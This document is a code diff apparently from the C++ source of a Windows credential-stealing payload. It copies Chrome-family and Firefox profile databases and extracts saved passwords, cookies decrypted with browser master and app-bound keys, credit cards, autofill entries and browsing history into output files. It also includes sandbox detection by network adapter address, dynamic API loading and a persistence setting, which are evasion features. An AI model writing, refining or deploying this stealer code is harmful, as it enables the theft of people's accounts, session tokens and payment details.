+            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                 sqlite3_stmt* st = nullptr;
                 const char* q = "SELECT origin_url, username_value, password_value FROM logins";
                 if (api.prepare_v2(db, q, -1, &st, nullptr) == SQLITE_OK && st) {
@@ -1137,13 +1489,35 @@ static void exportChromiumReadable(
         txt << "=== Cookies: " << browserName << " / " << profileName << " ===\n";
         int count = 0;
         for (const char* rel : { "\\Network\\Cookies", "\\Cookies" }) {
-            std::string tmp = copyDb(profilePath + rel);
-            if (tmp.empty()) continue;
+            std::string src = profilePath + rel;
+            bool exists = pathExists(src);
+            WIN32_FILE_ATTRIBUTE_DATA fad = {};
+            DWORD srcSize = 0;
+            if (GetFileAttributesExA(src.c_str(), GetFileExInfoStandard, &fad))
+                srcSize = fad.nFileSizeLow;
+            txt << "[dbg] path=" << src << " exists=" << (exists ? 1 : 0)
+                << " size=" << srcSize << "\n";
+            if (!exists) continue;
+
+            std::string tmp = copyDb(src);
+            if (tmp.empty()) {
+                txt << "[dbg] copy FAILED err=" << GetLastError() << "\n";
+                continue;
+            }
+            WIN32_FILE_ATTRIBUTE_DATA tad = {};
+            DWORD tmpSize = 0;
+            if (GetFileAttributesExA(tmp.c_str(), GetFileExInfoStandard, &tad))
+                tmpSize = tad.nFileSizeLow;
+            txt << "[dbg] copy OK tmp=" << tmp << " size=" << tmpSize << "\n";
+
             sqlite3* db = nullptr;
-            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) == SQLITE_OK && db) {
+            int openRc = api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr);
+            if (openRc == SQLITE_OK && db) {
                 sqlite3_stmt* st = nullptr;
                 const char* q = "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value, value FROM cookies";
-                if (api.prepare_v2(db, q, -1, &st, nullptr) == SQLITE_OK && st) {
+                int prepRc = api.prepare_v2(db, q, -1, &st, nullptr);
+                txt << "[dbg] open=" << openRc << " prepare=" << prepRc << "\n";
+                if (prepRc == SQLITE_OK && st) {
                     while (api.step(st) == SQLITE_ROW) {
                         std::string host = sqlText(api, st, 0);
                         std::string name = sqlText(api, st, 1);
@@ -1167,13 +1541,47 @@ static void exportChromiumReadable(
                         if (count >= 8000) break;
                     }
                     api.finalize(st);
+                } else {
+                    // schema fallback without plain value column
+                    st = nullptr;
+                    const char* q2 = "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies";
+                    prepRc = api.prepare_v2(db, q2, -1, &st, nullptr);
+                    txt << "[dbg] prepare_fallback=" << prepRc << "\n";
+                    if (prepRc == SQLITE_OK && st) {
+                        while (api.step(st) == SQLITE_ROW) {
+                            std::string host = sqlText(api, st, 0);
+                            std::string name = sqlText(api, st, 1);
+                            std::string path = sqlText(api, st, 2);
+                            int secure = api.column_int ? api.column_int(st, 3) : 0;
+                            const void* blob = api.column_blob(st, 6);
+                            int blen = api.column_bytes ? api.column_bytes(st, 6) : 0;
+                            std::string val = decryptChromiumValue(masterKey, appBoundKey, (const BYTE*)blob, blen, true);
+                            if (val.empty() || !looksLikeText(val))
+                                val = val.empty() ? "[encrypted]" : sanitizeDecrypted(val);
+                            txt << host << "\t" << (secure ? "TRUE" : "FALSE") << "\t" << path << "\t"
+                                << (secure ? "TRUE" : "FALSE") << "\t0\t" << name << "\t" << val << "\n";
+                            count++;
+                            if (count >= 8000) break;
+                        }
+                        api.finalize(st);
+                    }
                 }
                 api.close(db);
+            } else {
+                txt << "[dbg] open FAILED rc=" << openRc << "\n";
             }
             DeleteFileA(tmp.c_str());
+            DeleteFileA((tmp + "-wal").c_str());
+            DeleteFileA((tmp + "-shm").c_str());
+            DeleteFileA((tmp + "-journal").c_str());
             if (count > 0) break;
         }
         txt << "Total cookies: " << count << "\n";
+        if (appBoundKey.empty())
+            txt << "Note: app_bound_key missing (v20 stays encrypted; run elevated)\n";
+        else
+            txt << "app_bound_key: OK (" << appBoundKey.size() << " bytes)\n";
+        txt << "master_key: " << (masterKey.empty() ? "FAIL" : ("OK (" + std::to_string(masterKey.size()) + " bytes)")) << "\n";
         std::string s = txt.str();
         out.push_back({ folder + "cookies.txt", std::vector<char>(s.begin(), s.end()) });
     }
@@ -1186,7 +1594,7 @@ static void exportChromiumReadable(
         std::string tmp = copyDb(profilePath + "\\Web Data");
         if (!tmp.empty()) {
             sqlite3* db = nullptr;
-            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) == SQLITE_OK && db) {
+            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                 sqlite3_stmt* st = nullptr;
                 const char* q =
                     "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, nickname FROM credit_cards";
@@ -1235,7 +1643,7 @@ static void exportChromiumReadable(
         std::string tmp = copyDb(profilePath + "\\Web Data");
         if (!tmp.empty()) {
             sqlite3* db = nullptr;
-            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) == SQLITE_OK && db) {
+            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                 sqlite3_stmt* st = nullptr;
                 if (api.prepare_v2(db, "SELECT name, value FROM autofill LIMIT 2000", -1, &st, nullptr) == SQLITE_OK && st) {
                     while (api.step(st) == SQLITE_ROW) {
@@ -1261,7 +1669,7 @@ static void exportChromiumReadable(
         std::string tmp = copyDb(profilePath + "\\History");
         if (!tmp.empty()) {
             sqlite3* db = nullptr;
-            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) == SQLITE_OK && db) {
+            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                 sqlite3_stmt* st = nullptr;
                 const char* q = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 500";
                 if (api.prepare_v2(db, q, -1, &st, nullptr) == SQLITE_OK && st) {
@@ -1364,7 +1772,7 @@ static std::vector<std::pair<std::string, std::vector<char>>> grabBrowserDataFil
                             std::ostringstream txt;
                             txt << "=== Firefox Cookies: " << findData.cFileName << " ===\n";
                             int count = 0;
-                            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) == SQLITE_OK && db) {
+                            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                                 sqlite3_stmt* st = nullptr;
                                 if (api.prepare_v2(db,
                                     "SELECT host, name, value, path, isSecure FROM moz_cookies",
@@ -1390,7 +1798,7 @@ static std::vector<std::pair<std::string, std::vector<char>>> grabBrowserDataFil
                             std::ostringstream txt;
                             txt << "=== Firefox History: " << findData.cFileName << " ===\n";
                             int count = 0;
-                            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) == SQLITE_OK && db) {
+                            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                                 sqlite3_stmt* st = nullptr;
                                 if (api.prepare_v2(db,
                                     "SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 500",
@@ -2473,13 +2881,16 @@ static bool checkSandboxProcesses() {
 }
 
 static bool checkSandboxMac() {
+    auto& api = dynApi();
+    if (!api.GetAdaptersAddresses) return false;
+
     ULONG outBufLen = 0;
-    if (GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, nullptr, &outBufLen) != ERROR_BUFFER_OVERFLOW)
+    if (api.GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, nullptr, &outBufLen) != ERROR_BUFFER_OVERFLOW)
         return false;
 
     std::vector<BYTE> buf(outBufLen);
     PIP_ADAPTER_ADDRESSES adapters = (PIP_ADAPTER_ADDRESSES)buf.data();
-    if (GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, adapters, &outBufLen) != NOERROR)
+    if (api.GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, adapters, &outBufLen) != NOERROR)
         return false;
 
     for (PIP_ADAPTER_ADDRESSES p = adapters; p; p = p->Next) {
@@ -3163,21 +3574,9 @@ static bool hasCliFlag(const char* cmd, const char* flag) {
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
     srand((unsigned int)GetTickCount());
+    dynApi(); // init dynamic APIs early
     bool cliMode = hasCliFlag(lpCmdLine, "--cli") || hasCliFlag(lpCmdLine, "/cli");
-
-    // Always leave a breadcrumb so we can verify payload started
-    {
-        char marker[MAX_PATH];
-        GetTempPathA(MAX_PATH, marker);
-        strcat_s(marker, "osk4rrv_payload_ran.txt");
-        HANDLE h = CreateFileA(marker, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-        if (h != INVALID_HANDLE_VALUE) {
-            const char* msg = "payload started\r\n";
-            DWORD w = 0;
-            WriteFile(h, msg, (DWORD)strlen(msg), &w, nullptr);
-            CloseHandle(h);
-        }
-    }
+    bool onceMode = hasCliFlag(lpCmdLine, "--once") || hasCliFlag(lpCmdLine, "/once");
 
     PayloadConfig cfg = loadConfig();
     if (cliMode) {
@@ -3191,6 +3590,13 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
         cfg.persistence = false;
         if (cfg.sessionId.empty())
             cfg.sessionId = "CLI-TEST";
+        executeFeatures(cfg, true);
+        return 0;
+    }
+    if (onceMode) {
+        // self-hit: use payload.ini options, dump to result/, exit (no update loop)
+        if (cfg.sessionId.empty())
+            cfg.sessionId = "ONCE-TEST";
         executeFeatures(cfg, true);
         return 0;
     }
